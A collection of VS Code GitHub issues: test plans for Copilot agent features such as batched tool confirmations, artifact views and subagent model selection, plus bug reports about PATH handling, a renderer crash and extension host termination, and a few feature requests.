this iteration, we improved on the UI on batching tool calls in an effort to avoid having to click in a ton of different places when we get tool calls that require approval in parallel.

this now works on all confirmations, including single confirmations and subagent confirmations.

## Testing:
1. ensure that `chat.tools.confirmationCarousel.enabled` is enabled
2. trigger tool calls that require confirmation in parallel - this can be done by prompting the model in the user request. i've had success testing with something along the lines of the folloiwng:
```
use the list dir to search for vscode and vscode-copiolot chat folders outside of this workspace in parallel.
```
3. alternatively, you can prompt via extension:

```ts
const commands = [
{ command: 'echo "Terminal 1: Hello from first terminal"', explanation: 'First parallel terminal command', goal: 'Test parallel terminal 1' },
{ command: 'echo "Terminal 2: Hello from second terminal"', explanation: 'Second parallel terminal command', goal: 'Test parallel terminal 2' },
{ command: 'echo "Terminal 3: Hello from third terminal"', explanation: 'Third parallel terminal command', goal: 'Test parallel terminal 3' },
];

const invocations = commands.map(cmd =>
	vscode.lm.invokeTool('run_in_terminal', {
		input: {
			command: cmd.command,
			explanation: cmd.explanation,
			goal: cmd.goal,
			isBackground: false,
			timeout: 15000,
		},
		toolInvocationToken,
	})
);
```

4. test in both CLI in chat, the agents app, and local chat.
5. test accept all, skip, and allowing once for each tool!

Title: Test: Artifact View — Rules, Subagent Sources, and Artifact Tools

Description:
Refs: https://github.com/microsoft/vscode/issues/309325

- [x] anyOS @isidorn
- [x] anyOS @dileepyavan

Complexity: 4

[Create Issue](https://github.com/microsoft/vscode/issues/new?template=blank&body=Testing+%23309325%0A%0A&assignees=hediet)


[Create Issue](https://github.com/microsoft/vscode/issues/new?template=blank&body=Testing+%23309326%0A%0A&assignees=hediet)

---

The artifacts view in chat surfaces important outputs (screenshots, plans, files) in a collapsible tree widget. Artifacts can come from multiple sources simultaneously:

- **Rules**: deterministic extraction from conversation content based on MIME-type patterns, file-path globs, and memory-file-path globs
- **`artifacts` tool**: the agent or subagent explicitly sets artifacts via tool call
- **`artifactRules` tool**: overrides the rules-based extraction config for the current session

All sources are merged and shown together, grouped by origin (rules, agent, each subagent).

## Setup

- Enable: `"chat.artifacts.enabled": true`
- Default rules are already configured — no extra settings changes needed for basic tests

---

## A. Rules-based artifact extraction

### 1. Screenshots from tool results (byMimeType)

- Default rule: `"image/*": { "groupName": "Screenshots", "onlyShowGroup": true }`
- In agent mode, ask the agent to take a screenshot using the integrated browser (e.g. "open https://example.com in the browser and take a screenshot")
- Verify the artifact widget appears with a "Screenshots" group
- Verify `onlyShowGroup: true` means only the group header is shown, not individual screenshot items
- Click the group — verify it opens the screenshot carousel

### 2. Change onlyShowGroup to false

- In settings, change the rule to `"image/*": { "groupName": "Screenshots", "onlyShowGroup": false }`
- Verify the artifact widget updates automatically — individual screenshot files should now be listed under the group

### 3. Plans from file writes (byFilePath)

- Default rule: `"**/*plan*.md": { "groupName": "Plans" }`
- Ask the agent to create a plan file on disk (e.g. "create a plan.md for refactoring the auth module")
- Verify the artifact widget shows a "Plans" group with the file listed
- Click the plan — verify it opens in the editor

### 4. Plans from memory writes (byMemoryFilePath)

- Default rule: `"**/*plan*.md": { "groupName": "Plans" }`
- Ask the agent to write a plan to memory (e.g. "save a plan.md to session memory with the refactoring steps")
- Verify the memory-written plan appears in the "Plans" group in the artifact widget
- Click the plan — verify it opens (resolves the memory file URI)

### 5. No artifacts if no rules match

- Clear all artifact rules in settings (set `byMimeType`, `byFilePath`, and `byMemoryFilePath` to `{}`)
- Verify the artifact widget disappears for existing conversation content (no rules match)

---

## B. `artifacts` tool (main agent)

### 6. Agent sets artifacts via tool

- Ask the agent to set artifacts explicitly (it should call the `artifacts` tool)
- Verify artifacts appear in the widget
- Ask the agent to update the artifact list — verify the list is overwritten (not appended) on each tool call

### 7. URI validation

- Have the agent set an artifact with a `file://` URI that doesn't exist
- Verify an error is thrown: "Artifact URI does not exist"
- Set an artifact with an `https://` URI — verify it succeeds (no existence check for HTTP)

---

## C. Subagent artifacts via `artifacts` tool

### 8. Two subagents set artifacts in parallel

- Ask the agent: "Run two subagents in parallel — each should research a different topic and save their findings to `results.md`, then set it as an artifact"
- Verify each subagent's artifacts appear in a separate group in the artifact widget, labeled with the subagent's name
- Verify both groups are visible simultaneously

### 9. Clear subagent artifacts

- With subagent artifacts showing in the widget, look for a clear/dismiss action on a subagent group
- Click it — verify only that subagent's artifacts are removed, not the other sources

---

## D. `artifactRules` tool

### 10. Override rules via tool call

- The agent calls the `artifactRules` tool with custom rules, e.g.:
  ```json
  { "byMimeType": { "text/html": { "groupName": "Web Pages" } }, "byFilePath": { "**/*.css": { "groupName": "Stylesheets" } } }
  ```
- Verify the session now uses these overridden rules instead of the settings-based ones
- Verify previously produced and newly produced artifacts follow the overridden rules

Title: Test: Model Parameter in Run Subagent Tool

Description:
Refs: https://github.com/microsoft/vscode/issues/298380

- [x] anyOS @federicobrancasi
- [x] anyOS @kycutler

Complexity: 3

[Create Issue](https://github.com/microsoft/vscode/issues/new?template=blank&body=Testing+%23298380%0A%0A&assignees=hediet)


[Create Issue](https://github.com/microsoft/vscode/issues/new?template=blank&body=Testing+%23309322%0A%0A&assignees=hediet)

---

The `runSubagent` tool now accepts an optional `model` parameter that lets the LLM (or a user via system prompt) request a specific model for the subagent invocation. The model is specified as a qualified name like `"Model Name (Vendor)"`.

## Setup

- Use VS Code Insiders with Copilot
- Have multiple models available in the model picker (e.g. GPT-4o, Claude Sonnet 4.6)
- Agent mode in chat

## 1. Subagents use different models

- Open a chat in agent mode
- Ask the agent: "Run two subagents — one with GPT-4o (copilot) and one with Claude Sonnet 4.6 (copilot). Each subagent should report which model it is running on."
- Verify each subagent runs successfully
- Verify the two subagents report different models corresponding to what was requested

## 2. Explicit model overrides agent-configured model

- Create a custom agent `.md` file with a specific model configured (e.g. `model: GPT-4o (copilot)`)
- Ask the LLM to invoke that agent via subagent but explicitly set `model` to a different model (e.g. `"Claude Sonnet 4.6 (copilot)"`)
- Verify the explicit `model` parameter takes precedence over the agent's configured model

## 3. Multiplier constraint — model not more expensive than main model

- Select a cheaper model as your main chat model (e.g. GPT-4o Mini)
- Ask the agent to "use a subagent with model GPT-4o (copilot)" or another model with a higher multiplier
- Verify the tool returns an error message explaining the model exceeds the current model's cost tier

## 4. Unknown model name error

- Ask the agent to use a subagent with a model name that doesn't exist (e.g. `"NonExistent Model (copilot)"`)
- Verify a clear error message: `Requested model 'NonExistent Model (copilot)' not found.`

## 5. No model specified — falls back to main model

- Run a subagent without specifying any model parameter
- Verify the subagent uses the same model as the parent conversation

Comments:
Verified.
Overall works well!

Title: Independent Rendering Setting for Tabs and Spaces

Description:
<!-- ⚠️⚠️ Do Not Delete This! feature_request_template ⚠️⚠️ -->
<!-- Please read our Rules of Conduct: https://opensource.microsoft.com/codeofconduct/ -->
<!-- Please search existing issues to avoid creating duplicates. -->

<!-- Describe the feature you'd like. -->
Provide the ability to independently toggle the rendering of tabs and spaces. Currently, `editor.renderWhitespace` treats all whitespace characters as a single group, which can lead to excessive visual noise in specific formatting styles.

<img width="812" height="300" alt="Image" src="https://github.com/user-attachments/assets/e0416eea-5afa-4278-a572-df99c399fe0e" />

As shown in the attached screenshot, I use tabs for logical indentation and spaces for character-precise alignment (e.g., aligning function arguments across multiple lines).

When `editor.renderWhitespace` is set to `all`, the alignment spaces create a dense field of dots that are uncomfortable to look at. An option to selectively render tabs and spaces would solve this.

![Image](https://github.com/user-attachments/assets/558b05d1-9b38-4ad0-a252-97afa13bee6b)

Comments:
<!-- 6d457af9-96bd-47a8-a0e8-ecf120dfffc1 -->

If it receives 20 upvotes we will move it to our backlog. If not, we will close it. To learn more about how we handle feature requests, please see our [documentation](https://aka.ms/vscode-issue-lifecycle).

Happy Coding!

Title: Integrated terminal: VS Code injects installation root into process PATH, code CLI resolves to Code.exe instead of code.cmd

Description:
﻿### Problem

VS Code injects `C:\Program Files\Microsoft VS Code` at an early position in the integrated terminal's process PATH. This causes `code` to resolve to `Code.exe` (the GUI binary) instead of `code.cmd` in the `bin\` subfolder.

Every `code` CLI invocation (`code --version`, `code --list-extensions`, etc.) opens a **new VS Code window** instead of executing in the terminal.

### Version

- VS Code: 1.115.0 (system setup)
- OS: Windows 11 (10.0.26100)
- Not running as Administrator
- Compatibility Run as admin is NOT set on Code.exe

### Steps to Reproduce

1. Install VS Code system-wide (default: `C:\Program Files\Microsoft VS Code`)
2. System PATH correctly contains only `C:\Program Files\Microsoft VS Code\bin`
3. Open VS Code integrated terminal (PowerShell)
4. Run: `env:PATH -split ';' | Where-Object { _ -match 'VS Code' }`
   - Shows `C:\Program Files\Microsoft VS Code` at position 2
   - Shows `C:\Program Files\Microsoft VS Code\bin` at position 33
5. Run: `Get-Command code | Select-Object Source`
   - Shows `C:\Program Files\Microsoft VS Code\Code.exe` (wrong!)
6. Run: `code --version` - opens a new VS Code window instead of printing the version

### Expected Behavior

`code` should resolve to `code.cmd` in `bin\`, which sets ELECTRON_RUN_AS_NODE=1 and runs cli.js correctly.

### Root Cause

VS Code prepends its installation directory (containing Code.exe) to the terminal's process PATH, shadowing the correct `bin\code.cmd`.

### Impact on Copilot Agent Mode

GitHub Copilot agent mode uses run_in_terminal to execute `code --list-extensions` and similar CLI commands. Each invocation spawns a new VS Code window without the user's consent. Especially disruptive during automated multi-step tasks.

### Workaround

In settings.json:
`terminal.integrated.env.windows`: { `PATH`: `C:\Program Files\Microsoft VS Code\bin;env:PATH` }

This prepends bin\ so code.cmd takes priority over the injected Code.exe.

### Note

This is NOT the admin/elevated terminal issue (#91613, fixed in 1.110). This occurs in a normal non-elevated terminal session.


Comments:
/duplicate [309315](https://github.com/microsoft/vscode/issues/309315)

---

Title: Integrated terminal: VS Code injects installation root into process PATH, code CLI resolves to Code.exe instead of code.cmd

Description:
﻿### Problem

VS Code injects `C:\Program Files\Microsoft VS Code` at an early position in the integrated terminal's process PATH. This causes `code` to resolve to `Code.exe` (the GUI binary) instead of `code.cmd` in the `bin\` subfolder.

Every `code` CLI invocation (`code --version`, `code --list-extensions`, etc.) opens a **new VS Code window** instead of executing in the terminal.

### Version

- VS Code: 1.115.0 (system setup)
- OS: Windows 11 (10.0.26100)
- Not running as Administrator
- Compatibility Run as admin is NOT set on Code.exe

### Steps to Reproduce

1. Install VS Code system-wide (default: `C:\Program Files\Microsoft VS Code`)
2. System PATH correctly contains only `C:\Program Files\Microsoft VS Code\bin`
3. Open VS Code integrated terminal (PowerShell)
4. Run: `env:PATH -split ';' | Where-Object { _ -match 'VS Code' }`
   - Shows `C:\Program Files\Microsoft VS Code` at position 2
   - Shows `C:\Program Files\Microsoft VS Code\bin` at position 33
5. Run: `Get-Command code | Select-Object Source`
   - Shows `C:\Program Files\Microsoft VS Code\Code.exe` (wrong!)
6. Run: `code --version` - opens a new VS Code window instead of printing the version

### Expected Behavior

`code` should resolve to `code.cmd` in `bin\`, which sets ELECTRON_RUN_AS_NODE=1 and runs cli.js correctly.

### Root Cause

VS Code prepends its installation directory (containing Code.exe) to the terminal's process PATH, shadowing the correct `bin\code.cmd`.

GitHub Copilot agent mode uses run_in_terminal to execute `code --list-extensions` and similar CLI commands. Each invocation spawns a new VS Code window without the user's consent. Especially disruptive during automated multi-step tasks.

### Workaround

In settings.json:
`terminal.integrated.env.windows`: { `PATH`: `C:\Program Files\Microsoft VS Code\bin;env:PATH` }

This prepends bin\ so code.cmd takes priority over the injected Code.exe.

### Note

This is NOT the admin/elevated terminal issue (#91613, fixed in 1.110). This occurs in a normal non-elevated terminal session.


Comments:
<img width="1033" height="2039" alt="Image" src="https://github.com/user-attachments/assets/cb3e0dd3-526f-43c5-b0a8-bf0d0b868bca" />

@scheilch Could not repro on my windows machine with windows powershell set as default and delegating to agent to run the commmand. 

Do you have this under Program Files instead of App Data because of company policy?

Potentially related to: 
https://github.com/microsoft/vscode/issues/300231
https://github.com/microsoft/vscode/issues/303021
https://github.com/microsoft/vscode/issues/302026

/cc @dmitrivMS 


@anthonykim1 Thanks for looking into this. Let me provide more detail:

**Yes, this is a system-wide installation** under `C:\Program Files\Microsoft VS Code` — standard enterprise deployment (DATEV company policy, installed via system setup, not user setup).

**The issue is specifically about PATH injection, not admin/elevation.** Here's what the integrated terminal's PATH looks like right now:

```
[2] C:\Program Files\Microsoft VS Code\bin      ← my workaround (settings.json)
[3] C:\Program Files\Microsoft VS Code           ← INJECTED by VS Code (the problem)
[34] C:\Program Files\Microsoft VS Code\bin      ← system PATH (correct)
```

**Without my workaround**, position `[3]` (the injected installation root containing `Code.exe`) comes before position `[34]` (`bin\` with `code.cmd`). Result: `Get-Command code` resolves to `Code.exe` → every `code --version` opens a new window.

**To reproduce:**
1. Install VS Code via **system setup** (not user setup) → installs to `Program Files`
2. Do NOT add the workaround to settings.json
3. Open integrated terminal
4. `$env:PATH -split ';' | Select-String 'VS Code'` — you'll see the installation root injected before `bin\`
5. `Get-Command code` → resolves to `Code.exe`

**The linked issues are different:**
- #300231, #303021, #302026 are about elevated/admin terminals — I'm running as a normal user, no elevation
- This is purely about VS Code prepending the installation **root** directory (which contains `Code.exe`) to the terminal's process PATH, shadowing the correct `bin\code.cmd` from the system PATH

**Key question:** Why does VS Code inject `C:\Program Files\Microsoft VS Code` (the root, containing the GUI binary) into the terminal PATH at all? Only `bin\` should be there.

This particularly impacts **Copilot Agent Mode**, which uses `run_in_terminal` to execute `code --list-extensions` and similar commands — each invocation spawns a new VS Code window.
@anthonykim1 Could you please reopen this? The issue is reproducible and I've provided detailed PATH evidence above.

Closing as *not reproducible* without trying a **system-wide installation** (which is the prerequisite) doesn't address the report. The user-setup installation to AppData uses a different PATH layout - the bug only manifests with the system setup under C:\Program Files\.

This is a real problem affecting enterprise users and Copilot Agent Mode. Happy to provide any additional diagnostics needed.

Title: Automatically update in Administrator in Windows

Description:
<!-- ⚠️⚠️ Do Not Delete This! feature_request_template ⚠️⚠️ -->
<!-- Please read our Rules of Conduct: https://opensource.microsoft.com/codeofconduct/ -->
<!-- Please search existing issues to avoid creating duplicates. -->

<!-- Describe the feature you'd like. -->

1. I always working on Administrator.
2. I want user-scope installation, I don't want system wide installation because I don't need to install vscode for other users.
3. I want VSCode automatically update.

Now it pops up 
```
Updates are disabled because you are running the user-scope installation of Visual Studio Code as Administrator.
```
Every time it stats up. And auto-update doesn't work, I have to download the user-scope installer and manually install it on each new version. 

Please add a option or something can bypass this restriction.

Comments:
@liyafe1997 Do you have UAC disabled on your machine?
> @liyafe1997 Do you have UAC disabled on your machine?

No UAC for Administrator
I am working on enabling automated updates for both system and user installs when UAC is disabled - that seems doable since everything is elevated already in those scenarios.

The problem with running user install as administrator with UAC enabled is we would be potentially applying admin ACLs in files which would then become unusable from a regular user account/process.

If you always work as administrator, why not disable UAC?

Title: Undo history for repository search (Ctrl Shift F)

Description:
<!-- ⚠️⚠️ Do Not Delete This! feature_request_template ⚠️⚠️ -->
<!-- Please read our Rules of Conduct: https://opensource.microsoft.com/codeofconduct/ -->
<!-- Please search existing issues to avoid creating duplicates. -->

<!-- Describe the feature you'd like. -->

Repository-wide search (accessed via Control + Shift + F, or H for replace) does not track its own undo/redo history. Code repositories are huge and crawling them using search is an essential part of any programmer's flow. I often have to track more than one possible lead in the code, and right now I do that with a separate document open in notepad++ for my queries, since search does not try to remember any past searches I've made.

I think it would be good to record unique searches that a user makes. Some ideas of when: interacting with search results, resizing the pane (to see search results), on focus change, etc. The history should be retained at least as long as the search page is continuously open.

Comments:
you can use the up/down arrows
to cycle through previous searches

same for ctrl+f find
Oh. I was trying ctrl+z, not terminal keybinds. Thanks! closing

Title: Agents: thread can disappear immediately while background agent keeps running and editing the workspace

Description:
## Summary

In **VS Code Insiders** with **GitHub Copilot Chat / Agents**, a newly-created agent thread can disappear from the visible Agents/Sessions UI almost immediately, while the background worker keeps running and continues making real workspace changes.

This is not a "task stopped" problem. The background work continues; the **UI-visible thread is what disappears**.

## Expected

- The thread should stay visible while the agent is running.
- If persistence partially fails, the thread should remain **recoverable** in the Sessions list instead of silently vanishing.
- A persistence/index failure should either block background launch or surface a visible broken/recoverable session state.

## Actual

- The visible agent thread disappears almost immediately after creation.
- The agent still appears to continue in the background and makes file edits / workspace changes.
- The user loses the visible conversation/thread even though the task is still executing.

## Repro pattern

This has been intermittent, but the pattern is:

1. Open a normal workspace in **Agents - Insiders**.
2. Start an agent task that performs actual file edits / multi-step work.
3. Very soon after creation, observe that the visible thread disappears from the Agents/Sessions UI.
4. Despite that, the workspace continues changing, indicating the background worker is still alive.

## Sanitized local evidence

I am intentionally **not** attaching raw agent transcripts, prompts, repository contents, or personal file paths because they contain private working context.

What I can share safely:

- The background worker clearly continued after the UI thread disappeared, because workspace files changed after the visible thread was gone.
- On the affected machine, lightweight session/debug records for the visible session path were missing or nearly empty, while a separate background/session-state event stream continued to show activity.
- This strongly suggests a divergence between **runtime/background agent execution** and the **persisted UI session record / index**.

## Likely area

This looks related to chat session persistence / restore / index handling, likely in or around:

- `src/vs/workbench/contrib/chat/common/model/chatSessionStore.ts`
- possibly related session creation / visibility wiring in chat service / controller code

## Why I think this belongs with existing chat-session persistence bugs

This symptom looks closely related to other cases where chat sessions are lost, malformed, or missing due to persistence/index issues.

Related issues / PRs:

- #308369 — Copilot Chat session history intermittently disappears
- #308730 — malformed `chatSessions` JSONL makes sessions unloadable
- #307348 — incomplete in-flight session data makes sessions unloadable
- #296890 — parallel agent writes can corrupt session JSONL
- #305109 — PR fixing session index loss during workspace transitions
- #308921 — PR fixing another `ChatSessionStore` flush/persistence bug

## Suggested fix direction

I suspect the product needs one or more of the following:

1. **Durably persist the session base record + index entry before background agent work begins**
   - If that write fails, do not silently launch a background worker that the UI cannot recover.

2. **Do not drop sessions entirely when persistence is incomplete or malformed**
   - Keep a visible/recoverable placeholder item in Sessions instead of making the thread disappear.

3. **Harden malformed/incomplete session recovery**
   - If a session log is incomplete or partially malformed, salvage what is valid instead of treating the session as missing.

4. **Regression tests**
   - disappearing session while background work continues
   - incomplete/malformed session data not removing the session from the visible list
   - any index/flush gap involved in agent-session visibility

## Environment

- VS Code: `1.116.0-insider`
- GitHub Copilot Chat extension/runtime observed version: `0.44.2026041005`
- OS: macOS
- Feature area: Agents / agent mode / session persistence

I can provide **redacted** logs if needed, but I do not want to upload raw prompts, task transcripts, or project-specific details.

Comments:
Draft PR opened: #309286

This PR is a small, targeted hardening change in `ChatSessionStore`: if incremental session serialization fails, VS Code now falls back to writing a full snapshot instead of aborting the write and leaving the session non-durable.

I kept the report sanitized and did not attach raw agent transcripts, prompt contents, project names, or personal file paths.

Happy Coding!
This likely root cause of the error is overpopulating of chat request with images in BASE64 format, which has been fixed in this PR: https://github.com/microsoft/vscode/pull/308901.

The fix is available in latest VS Code **Insiders** and **Stable** version **1.116** and beyond.
Please update to this (or later) version and verify if the issue is resolved.

If you still can reproduce the error with **413 response** code in chat, please ping me with the following information:
- VS Code version your are running
- What language model/version are you using?
- What was the chat doing immediately before it responded with the error?
- If there were images the chat was inspecting, how many were there and what were their sizes?

Title: VS Code Bug Report: Renderer Crash (SIGSEGV 11) when rendering certain emojis in Shell Scripts

Description:

Type: <b>Bug</b>

# VS Code Bug Report: Renderer Crash (SIGSEGV 11) when rendering certain emojis in Shell Scripts

## Description
VS Code window terminates unexpectedly (crashed, code 11) when opening a file containing specific emojis (e.g., 🔊, 🔇). The crash is reproducible even with extensions disabled and appears to be related to the `PNGReadPlugin` in the renderer process on macOS.

## Environment
- **VS Code Version:** 1.115.0
- **OS Version:** macOS 14.1 (23B74)
- **Architecture:** x64 (Intel(R) Core(TM) i5-6300U)

## Steps to Reproduce
1. Create a shell script (e.g., `test.sh`) with the following content:
   ```bash
   #!/usr/bin/env bash
   echo "🔊 Unmuted"
   echo "🔇 Muted"
   ```
2. Open the file in VS Code.
3. The window crashes immediately with the message: `The window terminated unexpectedly (reason: 'crashed', code: '11')`.

## Expected Behavior
The file should open normally, and the emojis should be rendered correctly.

## Actual Behavior
The renderer process crashes with a segmentation fault (SIGSEGV 11).

## Diagnostic Information
A macOS diagnostic report (`.ips`) identifies the crash in the `CrRendererMain` thread.

### Crash Summary
- **Exception Type:** `EXC_BAD_ACCESS (SIGSEGV)`
- **Exception Subtype:** `KERN_INVALID_ADDRESS`
- **Termination Signal:** `Segmentation fault: 11`
- **Faulting Thread:** `CrRendererMain`

### Relevant Stack Trace (from `Code Helper (Renderer)`)
```
0   com.apple.ImageIO              0x7ff817886c67 PNGReadPlugin::InitializePluginData(IIOImageReadSession*, IIODictionary*, IIODictionary*, CGImageMetadata*, CGColorSpace**, ReadPluginData&, PNGPluginData&, __CFDictionary*) + 869
1   com.apple.ImageIO              0x7ff8178858fc PNGReadPlugin::initialize(IIODictionary*) + 62
2   com.apple.ImageIO              0x7ff81787db8f IIOReadPlugin::callInitialize() + 407
3   com.apple.ImageIO              0x7ff81787d66a IIO_Reader::initImageAtOffset(CGImagePlugin*, unsigned long, unsigned long, unsigned long) + 78
4   com.apple.ImageIO              0x7ff817872e16 IIOImageSource::makeImagePlus(unsigned long, IIODictionary*) + 704
5   com.apple.ImageIO              0x7ff81787fe7f IIOImageSource::createImageAtIndex(unsigned long, IIODictionary*) + 81
6   com.apple.ImageIO              0x7ff81787fb55 CGImageSourceCreateImageAtIndex + 325
7   com.apple.CoreText             0x7ff81432f693 (anonymous namespace)::TCGImageData::TCGImageData(TFont const*, unsigned short, TsbixContext const&, double, CGPoint) + 1735
8   com.apple.CoreText             0x7ff8143340e2 DrawGlyphsAtPositions(TFont const*, unsigned short const*, CGPoint const*, unsigned long, CGContext*, (anonymous namespace)::DrawGlyphsConfiguration const&)::$_11::operator()(CGAffineTransform, CGAffineTransform) const + 230
9   com.apple.CoreText             0x7ff8143309bb DrawGlyphsAtPositions(TFont const*, unsigned short const*, CGPoint const*, unsigned long, CGContext*, (anonymous namespace)::DrawGlyphsConfiguration const&) + 3583
10  com.apple.CoreText             0x7ff8142d9f80 CTFontDrawGlyphs + 315
```

## Workaround
Removing the emojis from the file prevents the crash.

Title: Test: AI Generated branch/worktree names for Copilot CLI

Description:
Refs: https://github.com/microsoft/vscode/issues/306191

- [x] anyOS @bamurtaugh 
- [x] anyOS @hediet

Complexity: 2


[Create Issue](https://github.com/microsoft/vscode/issues/new?template=blank&body=Testing+%23309280%0A%0A&assignees=DonJayamanne)

---

## AI gnerated branch names for Copilot CLI

**Enable this setting `github.copilot.chat.cli.aiGenerateBranchNames.enabled` by setting it to `true`**
Note: This feature is `off` by default (release vscode after changing)

1. Open a VS Code folder (such as VS code repo or any other)
2. Open a new Chat Session
3. Select `Copilot CLI` chat agent
4. Ensure you select the `worktree` option  (see screenshot)
5. Send a prompt such as `explain the contents of this repo`, `explain the contents of xyz.ts`, `fix the tests of xyz.test.ts`
Verify the branch (worktree) thats created is not a random name, but something thats meaningful and aligned with the prompt
See below screenshot for sample name thats generated based on the prompt

(previously we'd generate branches named after some animals)

<img width="568" height="153" alt="Image" src="https://github.com/user-attachments/assets/2b9a3ee9-faa7-403b-88cf-9cb463944197" />

<img width="848" height="405" alt="Image" src="https://github.com/user-attachments/assets/d0ace664-221f-4376-96f2-b8ef3e51ee69" />

Comments:
Works! Just have to reload the window after setting it
Thanks , yes didn’t want this to be responsive to config changes as it’s only used to control feature for now
Thanks , yes didn’t want this to be responsive to config changes as it’s only used to control feature for now

Title: Test: Reasoning in Copilot CLI

Description:
Refs: https://github.com/microsoft/vscode/issues/304641

- [x] anyOS @aeschli

## Thinking Effort Level in Model Picker for Copilot CLI

(same as https://github.com/microsoft/vscode/issues/303685, but this is specific to Copilot CLI)

**Enable/Disable this setting `github.copilot.chat.cli.thinkingEffort.enabled` by setting it to `true/false`**
Note: This feature is `on` by default

A new **Thinking Effort** submenu has been added to the model picker for models in Copilot CLI

1. **Picker Works:**
   - Ensure you are using Copilot CLI agent (not Local)
   - Select a reasoning model (e.g., Claude Sonnet 4.6, GPT-5.4); verify a ">" arrow appears on the picker item
   - Click the arrow; verify a "Thinking Effort" submenu shows effort levels for that model
   - Select an effort level; verify the picker label updates (e.g., "Claude Sonnet 4.6 · High")
   - Select a non-reasoning model (e.g., GPT-4.1, GPT-4o); verify no submenu appears
   - Try a few different Anthropic and OpenAI models
   - Available levels vary per model (e.g., some have None, some skip Medium)

2. **Effort Reaches the Backend:** 
- First locate the `<home>/.copilot/session-state` folder
- Rename this folder to something else e.g. `session-state-backup`
This will temporarily remove all of your Copilot CLI sessions (you can just restore this folder to get all of your sessions back)
- Now start a session with a specific thinking/reasoning level
- Identify the new session created in this folder
- Look for the file `events.jsonl` and look for a row in this file that contains an entry similar to the following
```
"selectedModel":"claude-sonnet-4.6","reasoningEffort":"medium"
```
- As you send more requests with different model/reasoning levels, you'll get new entries in this file with different event, verify the latest entry contains the correct model and reasoning effort.

Comments:
I am seeing the requests sent with the same reasoning effort in the UI. I also see the `session.model_change` events in the log ✅

Title: Remote SSH: extension host terminated on session switch kills background processes (regression)

Description:
## Issue

After updating to the latest VSCode (server commit `41dd792b5e652393e7787322889ed5fdc58bd75b`), switching between extension panel sessions on Remote SSH causes the **entire extension host to be terminated**, killing all child processes (exit code 143 / SIGTERM).

Previously (server commit `e7fb5e96c0730b9deb70b33781f98e2f35975036`, ~April 1), the extension host survived session switches and background processes continued running.

## Environment

- **Client**: VSCode (latest stable, April 2026)
- **Remote**: macOS Tahoe 26.3.1 (Mac Mini, arm64) via Remote SSH over Tailscale
- **Extension affected**: Claude Code (`anthropic.claude-code`) — but the issue is at the extension host level, not extension-specific

## Steps to reproduce

1. Connect to a remote machine via Remote SSH
2. Open an extension panel that spawns a long-running child process (e.g., Claude Code session)
3. Start a task in that session
4. Switch to a different session/tab in the same panel
5. The previous session's process receives SIGTERM (exit code 143)

## Logs

Extension host log shows the termination is initiated by the renderer on every switch:

```
Extension host terminating: received terminate message from renderer
  at cP.terminate (extensionHostProcess.js:505:12344)
  at i.terminate (extensionHostProcess.js:507:1072)
Extension host with pid XXXXX exiting with code 0
```

Claude Code extension log shows the channel being forcefully closed:

```
Closing Claude on channel: hrzqndz3grv
Error spawning Claude (on channel hrzqndz3grv): Error: Query closed before response received
Failed to load config cache: Error: Query closed before response received
```

## Frequency

In a single day session: **6 extension hosts created** (exthost1 through exthost6), each terminated when a new one started. On the previous server version (same usage pattern), extension hosts survived and coexisted.

## Comparison

| Server commit | Date | Extension hosts/day | Background processes survive? |
|--------------|------|---------------------|-------------------------------|
| `e7fb5e96` | Apr 1 | 1-2 | Yes |
| `41dd792b` | Apr 12 | 6 | **No** |

## Possibly related

- #305240 — Extension host shutdown hang regression in 1.113.0 (fixed in 1.114.0)
- #306129 — Duplicate of above
- microsoft/vscode-remote-release#11546 — Extension host terminated with "renderer closed the MessagePort"

The 1.114.0 fix for #305240 worked correctly (server `e7fb5e96`). The new server (`41dd792b`) appears to have re-introduced aggressive extension host termination on Remote SSH.

Comments:
**Update: root cause was on our side, not VSCode.**

After further investigation, the SIGTERM (exit code 143) was caused by a custom `SessionStart` hook script that killed all Claude Code processes except the newest one. When switching sessions, the new session's startup hook would terminate the previous session's process.

The VSCode Server update was a red herring — the behavior would have occurred on any version.

Closing this as not a VSCode bug. Apologies for the noise.

---

Title: Feature request: New-install option for queue-first command processing

Description:
# Change Ticket: Microsoft VS Code/Copilot Chat — Queue-First Command Processing Config For New Installs

**ID:** DEV-2026-0412-001
**Date:** 2026-04-12
**Priority:** High
**Type:** Enhancement / Default Configuration
**Status:** Open
**Requested by:** Tom B.
**Assigned to:** Microsoft VS Code + Copilot Chat Product Team

---

## Problem

Current command execution workflows are often stop-and-wait (steering style), which slows users who run repeatable operations in sequence. Teams need queue-first behavior where users can stack command inputs and keep processing without manual pauses between each command.

For new installs, this should be configurable as a default behavior so organizations can standardize operations from day one.

## Request

Add a product-level configuration option for new installs that allows administrators/users to choose:

- `queue-first` (recommended): users can stack command requests and execution continues by default.
- `steering-first`: one-by-one interactive stop-and-confirm behavior.

This should be available during first-run/onboarding and as a persistent setting in product configuration.

## Desired Behavior

1. New install includes an explicit setup choice for command processing mode.
2. Queue-first mode supports batching/stacking multiple commands in one run.
3. Queue-first mode continues processing after individual item failures by default.
4. Optional fail-fast mode is available for strict pipelines.
5. Setting is org-policy compatible (for managed environments) and user-overridable when policy allows.
6. UI clearly displays active mode (`Queue` vs `Steering`) and current queue status.

## Why This Matters

- Reduces operator wait time and context switching.
- Improves reliability for repeatable SDLC workflows.
- Aligns with automation-first usage patterns in enterprise environments.
- Prevents accidental workflow drift where some users run queueing and others run one-by-one.

## Acceptance Criteria

- [ ] First-run install flow includes command processing mode selection.
- [ ] Settings page includes persistent toggle/enum for processing mode.
- [ ] Queue-first supports stacking multiple commands without stopping between items.
- [ ] Queue-first default behavior continues after failures; fail-fast is opt-in.
- [ ] Managed policy setting can enforce queue-first for enterprise tenants.
- [ ] Documentation includes migration guidance from steering-first to queue-first.

## Proposed Configuration Shape

Example (illustrative):

```json
{
  "copilot.commandExecution.mode": "queue",
  "copilot.commandExecution.continueOnError": true,
  "copilot.commandExecution.failFast": false
}
```

## Implementation Notes

- Preserve current behavior as backward-compatible fallback where needed.
- Add telemetry to compare completion rates/time-to-complete between modes.
- Provide clear warning text when switching modes for users with existing workflows.

## External Filing Targets

- VS Code repo issues: https://github.com/microsoft/vscode/issues
- Copilot Chat extension repo (if feature belongs there): https://github.com/microsoft/vscode-copilot-release/issues

## Business Impact

Queue-first default for new installs can materially increase throughput for engineering and operations teams that run repeated command pipelines, and lowers training overhead by establishing a consistent baseline behavior.


Comments:
This already exists.

---
